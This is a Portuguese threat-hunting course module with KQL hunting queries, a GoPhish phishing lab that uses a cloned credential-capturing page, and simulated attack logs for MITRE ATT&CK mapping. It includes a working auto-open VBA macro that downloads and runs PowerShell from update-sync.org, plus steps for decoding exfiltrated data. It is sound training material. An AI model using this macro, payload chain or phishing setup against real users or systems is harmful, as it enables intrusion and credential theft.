# módulo 01 - Introdução ao Threat Hunting
- 01.1.  Definição de Threat Hunting
- 01.2.  Habilidades
- 01.3.  Dicas de Estudo Focado em Threat Hunting
- 01.4.  Hipótese
- 01.5.  Busca, Impacto e Duração
- 01.6.  Conceitos básicos e importância para o Blue e Red Team
- 01.7.  Definição: Caça proativa a ameaças que escapam da detecção tradicional
- 01.8.  Diferença entre detecção reativa (SOC) e proativa (Threat Hunting)
- 01.9.  Estudos de caso sobre ataques reais
- 01.10. Exercícios Práticos com Simulações e Desafios

“quaisquer que sejam os passos, quaisquer objetos tocados por ele, o que quer que seja que ele deixe, mesmo que inconscientemente, servirá como uma testemunha silenciosa contra ele. Não apenas as suas pegadas ou toques, mas o seu cabelo, as fibras das suas calças, os vidros que ele porventura quebre, a marca da ferramenta que ele deixe, a tinta que ele arranhe, o sangue ou o sémem que deixe. Tudo isto, e muito mais, carrega um testemunho contra ele. Esta prova não se esquece. É distinta da excitação do momento. Não é ausente como as testemunhas humanas são. Constituem, per se, numa evidência factual.

A evidência física não pode estar errada, não pode cometer perjúrio por si própria, não se pode tornar ausente. Cabe aos humanos, procurá-la, estudá-la e compreendê-la, apenas os humanos podem diminuir o seu valor." — Paul Kirk, Crime Investigation: Physical Evidence and the Police Laboratory (1953)

## 01.4. Hipótese - Cenário Fictício: NeoGovTech
Queries de Hunting (KQL – Azure Sentinel)
```
// Aplicativos OAuth criados recentemente
AuditLogs
| where OperationName == "Add service principal"
| where TimeGenerated > ago(7d)
| project TimeGenerated, InitiatedBy, TargetResources
```
```
// Execução de PowerShell remota
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest" or contains "DownloadString"
| project DeviceName, InitiatingProcessAccountName, ProcessCommandLine, Timestamp
```

## 01.9. Estudos de caso sobre ataques reais
### 

### 

## 01.10. Exercícios Práticos com Simulações e Desafios

### Desafio 1: Simulação de Campanha de Phishing
Obs.: Criar uma conta no gmail, que possa ser descartada e habilitar MFA

Google App Passwords 
https://myaccount.google.com/apppasswords

GoPhish
https://github.com/gophish/gophish

Atualização do Kali
```
sudo apt update && sudo apt upgrade -y
```
Instalação do Go
```
sudo apt install golang -y
```
Download do repositório do GoPhish
```
git clone https://github.com/gophish/gophish.git
```
Acessando o diretório do repositório
```
cd gophish
```
Compilando o código fonte do GoPhish
```
go build
```
Executando o GoPhish
```
./gophish
```
Acessando via web
https://127.0.0.1:3333/
Obs.: Realizar a troca da senha no primeiro acesso, as credenciais são informadas no log da ferramenta.

Acessando o Gmail para criar a senha do App para utilização no GoPhish
https://myaccount.google.com/apppasswords

Criação do Sending Profiles
```
New
Name: Seu_Nome
SMTP From: seu_email@gmail.com
Host: smtp.gmail.com:465
Username: seu_email@gmail.com
Password: senha_do_app_gerada_no_gmail
Deixar Marcado: Ignore Certificate Errors
Send Test e Save
```
Users & Groups
```
New
Name: Grupo1
First Name: Nome
Last Name: Sobrenome
Email: seu_email@gmail.com
Position: Hunter
Add - - > Save changes
```
Email Templates
```
New
Name: Template1
Envelope Sender: HelpDesk <suporte@ti.com.br>
Subject: URGENTE!!! E-mail Hackeado!!!
Text:
============================================================================
Prezado(a) {{.Position}} {{.FirstName}} {{.LastName}} , Informo que seu e-mail foi hackeado!!! 
Com o seu acesso, dados sensíveis foram expostos na darkweb!!!

Clique aqui para trocar a sua senha imediatamente!!!

Reportar para o suporte assim que trocar a senha.

Sob pena de judicialização.
Help Desk TI
============================================================================
Selecionar o "Clique aqui" e apontar o link {{.URL}}

Deixar Marcado: Add Tracking Image
Save Template
```
Landing Pages
```
New 
Name: Login
Import Site: 
URL: https://site_a_ser_clonado
Deixar Marcado: Capture Submitted Data e Capture Passwords
Redirect to: https://site_a_ser_clonado
Save Page
```
New Campaign
```
New
Name: Campanha1
Email Template: Template1
Landing Pages: Login
URL: http://192.168.2.118  # IP do seu kali
Sending Profile:
Groups: Grupo1
Launch Campaingn
Launch - - > Ok
```

### Desafio 2: Mapeamento de TTPs com MITRE ATT&CK
Logs Simulados de um ataque fictício e mapear suas técnicas.

1. Log de e-mail (Phishing inicial)
```
Fonte: Mail Gateway
Timestamp: 2026-04-08T08:15:23Z
From: hr@secure-docs.org
To: finance.director@targetcorp.com
Subject: Lista de Demissoes 2026
Attachment: Lista_de_Demissoes_2026.doc
Verdict: Suspicious macro detected
```
2. Log de execução de macro (Office)
```
Fonte: Endpoint EDR
Timestamp: 2026-04-08T08:16:02Z
Host: FINANCE-PC01
Process: WINWORD.EXE
Child Process: powershell.exe
Command Line: powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://update-sync[.]org/dropper.ps1')"
Verdict: Malicious PowerShell execution
```
3. Log de persistência via tarefa agendada
```
Fonte: Windows Event Log – Task Scheduler
Timestamp: 2026-04-08T08:17:45Z  
Host: FINANCE-PC01  
Task Name: MicrosoftUpdateTask  
Action: powershell.exe -ExecutionPolicy ByPass -File "C:\Users\Public\update.ps1"  
Trigger: Daily at 08:00  
Verdict: Suspicious scheduled task created 
```
4. Log de movimentação lateral via SMB
```
Fonte: Network Sensor (Zeek)
Timestamp: 2026-04-08T08:20:12Z  
Source IP: 192.168.2.116  
Destination IP: 192.168.2.117  
Protocol: SMB  
Action: File transfer – `update.ps1` copied to `\\192.168.2.117\C$\Users\Public\`  
Verdict: Lateral movement suspected
```
5. Log de exfiltração via HTTP
```
Fonte: Proxy Logs
Timestamp: 2025-10-04T08:25:33Z  
Host: FINANCE-PC01  
Destination: secure-data.net  
URL: http://secure-data.net/api/upload?session=IyMjIyMjIyMjI
Payload Size: 16.0KB  
Verdict: Unusual outbound data transfer
```

Preparação do ambiente:
- Baixar Scripts ps1 no Kali Linux
```
wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo01/scripts/dropper.ps1
```
```
wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo01/scripts/update.ps1
```
- Subir WebServer em Python no Kali Linux
```
python -m http.server 80
```

- Alterar arquivo hosts no Windows10
```
c:\>notepad c:\Windows\System32\drivers\etc\hosts

	192.168.2.118	update-sync.org secure-data.net # Endereço de IP do Kali Linux
```

- VBA do arquivo Lista_de_Demissoes_2026.doc
```
Sub Document_Open()
    ADINT
End Sub

Sub AutoOpen()
    ADINT
End Sub

Sub ADINT()
    Dim str As String
    str = "powershell -exec bypass -w hidden (New-Object System.Net.WebClient).DownloadString('http://update-sync.org/dropper.ps1')|IEX"
    Shell str, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
- Verificação da tarefa agendada no Windows10
```
schtasks /query /fo LIST /v /tn "Update-sync"
```
- Verificação dos dados exfiltrados no WebServer do Kali Linux
```
nano data.txt
```
```
du -h data.txt
```
```
awk -F'session=' '{print $2}' data.txt | cut -d " " -f1 > base64.txt
```
```
cat base64.txt
```
```
cat base64.txt | base64 -d
```

### Desafio 3: Criação de Feed de Threat Intelligence


### Desafio 4: Simulação de Evasão e Persistência









